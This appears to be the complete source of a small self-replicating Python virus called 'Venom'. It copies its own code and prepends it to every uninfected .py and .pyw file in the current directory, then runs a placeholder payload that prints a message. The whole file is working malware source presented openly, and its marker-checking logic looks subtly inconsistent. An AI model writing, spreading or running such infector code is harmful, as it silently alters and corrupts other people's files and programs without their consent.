#Venom.Init

# 1.) make a copy of the entire virus program itself.
import sys
import glob
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "#Venom.Init":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "#Venom.Exit\n":
        break

# 2.) get other python files and infect them with the replicating code.
python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "#Venom.Init\n":
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)

# 3.) set and deploy the payload
def Payload():
    print("[Venom] Init")
Payload()

#Venom.Exit